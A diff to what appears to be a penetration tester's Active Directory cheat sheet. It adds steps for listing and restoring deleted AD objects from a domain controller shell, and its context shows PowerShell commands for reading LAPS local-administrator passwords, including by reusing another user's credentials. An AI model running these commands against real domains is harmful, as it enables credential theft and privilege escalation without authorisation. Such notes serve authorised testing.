@@ -53,6 +53,12 @@ Check for any ServicePrinicipalNames(SPNs) of other users from which we can extr
 We can read the LAPS password using the following
 `Get-ADComputer "ComputerNameHere" -Properties ms-mcs-AdmPwd, ms-mcs-AdmPwdExpirationTime, canonicalname` (If our user has the readlaps perm)
 
+### If we can get a shell on the DC, we can get all the deleted objects, which we might control after undeleting them if we can.
+We can get all the deleted objects using the following
+`Get-ADObject -Filter 'isDeleted -eq $True' -IncludeDeletedObjects` (Using the `Import-Module ActiveDirectory`)
+And then Restore it using the following
+`Restore-ADObject -Identity 'GUID of Object'`
+
 `$p = ConvertTo-SecureString 'PasswordOfUserAccount' -AsPlainText -Force;$c = New-Object System.Management.Automation.PSCredential ('UserAccount', $p)`
 and then `Get-ADComputer "ComputerNameHere" -Credential $c -Properties ms-mcs-AdmPwd, ms-mcs-AdmPwdExpirationTime, canonicalname` (If our user doesnt have readlaps perm but we have creds of a user having read laps perm)
 
